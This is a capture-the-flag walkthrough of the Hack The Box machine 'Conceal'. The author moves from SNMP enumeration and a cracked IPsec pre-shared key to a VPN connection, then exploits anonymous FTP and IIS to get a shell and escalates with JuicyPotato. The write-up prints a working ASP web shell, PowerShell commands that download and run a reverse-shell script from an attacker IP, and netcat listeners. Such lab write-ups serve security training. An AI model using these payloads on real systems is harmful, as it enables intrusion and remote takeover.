# Conceal [HTB](https://app.hackthebox.com/machines/168)
![conceal-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/conceal-01.png)


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 conceal.htb
```


This unfortunately resulted in no open TCP ports. I tested other types of TCP scans like `-sX`, `-sN`, `-sM`, to verify that indeed there are no TCP ports open. and all the scans came back empty.


So I ran a UDP scan with:

```bash
nmap -sU -p- --min-rate 10000 conceal.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/ports-02.png)


We see two ports with one of tehm being `isakmp` which is the IKE (Internet Key Exchange) service. However, UDP scan are less reliable and can return false positives as UDP is a stateless protocol, there is no true indication that a port is open or closed. Instead `nmap` has to relay on icmp responses from the target to determine if a UDP port is open or closed. 


However, nmap also has protocol-specific payloads as per the UDP port. For example, nmap can send a DNS specific request to UDP port 53 and analyze the response to determine if the port is open. To enumerate the UDP ports further, we can add the `-sC` switch to enable script probing of the ports:


```bash
nmap -sU -sC --top-ports 20 conceal.htb -oN nmap.scan
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/nmap-res-03.png)

![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/nmap-res-04.png)

![nmap-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/nmap-res-05.png)


Although we can see open TCP ports via the `netstat` output, trying to connect to them externally fails, they could be sitting behind a local firewall. We also see other UDP ports which return as filtered but we can focus primarly on the IKE service enabled on udp/500, and an the SNMP service on port udp/161. 


### SNMP Port UDP/161

To enumerate SNMP, we need to use a package called `snmp-mibs-downloader`. 


Download it, run it, and edit the config file as outlined in the below commands:

```bash
apt-get install snmp-mibs-downloader
download-mibs
# Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
sudo vi /etc/snmp/snmp.conf
```


Now we can use a tool like `snmpbulkwalk` to enumerate the SNMP service as such:

```bash
snmpbulkwalk -c public -v2c conceal.htb . | tee snmp_walk.log
```

![snmp-walk-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/snmp-walk-06.png)


Right at the top we see the following string: `IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43`.
We have what looks like a hashed password for the VPN, let's try to identify the hash on [crackstation](https://crackstation.net/):

![cracked-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/cracked-07.png)


We can see it's actually an NTLM hash, and it's cracked to `Dudecake1!`. 


Let's check the IKE service.


### IPSec/IKE Port udp/500


The first step in enumerating this service is finding the possible valid IPSec transformations. Each transform contains a number of attributes like the encryption algorithm, the integrety algorithm, a pre-shared key for authintication, distribution algorithmrand the tunnel lifetime. All of these attributes are used to establish the VPN tunnel. 


To do this, we can use a tool called `ike-scan` as such:

```bash
ike-scan -M conceal.htb 
```

![ike-scan-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/ike-scan-08.png)


From the output we can conclude that:

+ The IKE tunnel is encrypted with 3DES, SHA1 and modp1024. 
+ The authintication mechanism is a pre shared key. (Could also be a certificate, etc)
+ The IKE version used is version 1, not 2.


To connect to the VPN we need to use a tool called `strongswan`:

```bash
apt install strongswan
```

Depending on your Linux distro, you may have to install additional `strongswan` libraries to support different algorithms. For example, my Debian based Kali system didn't have the proper `strongswan` libraries to support 3DES encryption. 


To fix this install the additional libraries with:

```bash
apt install libstrongswan-standard-plugins
```


After the download has comeplete, we need to setup the config files to match the found transform. 

+ `/etc/ipsec.secrets`

Add the pre-shared key:

![key-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/key-09.png)


+ `/etc/ipsec.conf`

Add the following config options:

![config-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/config-10.png)


Here is the breakdown of the options:

+ `charondebug="all"` - Add verbosity to help us troubelshoot the connection.
+ `authby="secret"` - Use a pre-shared password for the authintication.
+ `ike`, `esp`, `keyexchange` -  Tranform inforamtion found with `ike-scan`.
+ `left` - The client IP.
+ `right` - The target IP.
+ `type="transport"` - The IPSec mode for the connection. 


After wev'e done configuring the IPSec options we need to do a quick restart:

```bash
ipsec restart
```

Now we can connect to the target with:

```bash
ipsec up conceal
```

![conn-success-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/conn-success-11.png)



## Recon Over VPN


With access to the TCP sockets over the VPN, we can run `nmap` once again:


```bash
nmap -sT -p- --min-rate 10000 conceal.htb
```

![nmap-vpn-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/nmap-vpn-12.png)

We need to add the `-sT` switch to tell `nmap` to establish the TCP three-way handshake, otherways we won't get any open ports. If even after adding the `-sT` switch you don't see any ports, restart the VPN connection with: 


```bash
ipsec down conceal
ipsec up conceal
```


Let's run a version detection scan againts the found ports:

```bash
nmap -sT -sCV -p 21,80,135,139,445 --min-rate 10000 conceal.htb
```

![nmap-vpn-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/nmap-vpn-13.png)


We have the following:

+ An FTP server on port 21.
+ An IIS/10.0 server on port 80.
+ An RPC-Endpoint mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.


Based on the `nmap` probing scripts we can see that annoymous FTP connections are allowed. We also see that SMB signing is not required. 


Let's start by taking a look at the IIS server, then move on to test the FTP and SMB servers as needed. 


## IIS Port 80

If we open the site at `http://conceal.htb/` we get the following:

![site-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/site-14.png)


Looks like a default IIS installation page. Let's run a directory scanner:


```bash
fuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://conceal.htb/FUZZ -e .txt,.xml,.html,.asp,.aspx
```

![ffuf-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/ffuf-15.png)


We have a single directory of `upload`, let's have a look:

![upload-dir-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/upload-dir-16.png)


Looks empty. The qeustion is how do we upload files to the target? 


We have two file sharing services enabled on the target with SMB and FTP, and we know the FTP allows anonymous connections. Let's check it out.


### FTP Port 21


Listing the FTP also returns an empty directory:

![ftp-empty-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/ftp-empty-17.png)


Let's try to upload files to the FTP:

```bash
echo 'test' > test.txt
```

![ftp-put-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/ftp-put-18.png)


We can write to the FTP at will. At this point I decided to check the `uploads` directory on the IIS:

![upload-file-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/upload-file-19.png)


Here is our file from the FTP. So we can upload files at will to the IIS server, let's put a reverse shell.



At first I created an aspx reverse shell using `msfvenom`, but unfortenatly this doesn't work on the target:

![not-found-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/not-found-20.png)


I tried creating an asp payload with `msfvenom` though it didn't work either. Instead we can use this simple asp web-shell: 

```asp
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

After we save this to a file and upload to the FTP we can test it with a simple command:

```bash
curl http://conceal.htb/upload/shell.asp?cmd=whoami
```

![whoami-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/whoami-21.png)


From here we can use [nishang](https://github.com/samratashok/nishang)'s `Invoke-PowerShellTcp.ps1` script. Make sure to invoke the script at the end:

![info-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/invoke-22.png)


Now we need to host this script via a python web server:

```bash
python3 -m http.server 80
```

Start the local listener with:

```bash
rlwrap nc -lnvp 443
```

And visit the following url:

```bash
http://conceal.htb/upload/shell.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.49/Invoke-PowerShellTcp.ps1%27)
```

We can see the target has succesfully retrived nishang's script from our python server:

![retrive-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/retrive-23.png)


On our local listener we get a shell:

![shell-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/shell-24.png)


## Privilege Escalation

After landing on the machine I start hunting for quick wins, for example listing any privileges we have with `whoami /priv`:

![privs-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/privs-25.png)


We can see we have the `SeImpersonate` privilege enabeld. Let's check the OS version to determine how to exploit this:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

![sysinfo-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/sysinfo-26.png)


We can see the target is running a Windows 10 Enterprise, we can use [JuicyPotato](https://github.com/ohpe/juicy-potato). Let's grab a copy of `JuicyPotato` to our working directory and host it via a python
server. 


Then we need to find a directory we can write to on the target. I found that `C:\users\Destitute\appdata\local\Temp` works. Once there, we can download the file with:

```cmd
wget "http://10.10.14.49/JuicyPotato.exe" -OutFile "C:\users\Destitute\appdata\local\Temp\jp.exe"
```


![dir-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/dir-27.png)


Now we can use the following command to fetch `Invoke-PowerShellTcp.ps1` and connect back to our target as NT-AUTHORITY:

```cmd
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.49/Invoke-PowerShellTcp.ps1')
```

Put this in a file named `rev.bat` on you attack machine, then download it to the target with:

```cmd
wget "http://10.10.14.49/rev.bat" -OutFile "C:\users\Destitute\appdata\local\Temp\rev.bat"
```


![bat-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/bat-28.png)


Now we can setup our listener with:

```bash
rlwrap nc -lnvp 9009
```

And execute the potato atttack with:

```cmd
C:\users\Destitute\appdata\local\Temp\jp.exe -t * -p C:\users\Destitute\appdata\local\Temp\rev.bat -l 9009 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

Which gives us a shell:

![root-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Conceal/img/root-29.png)
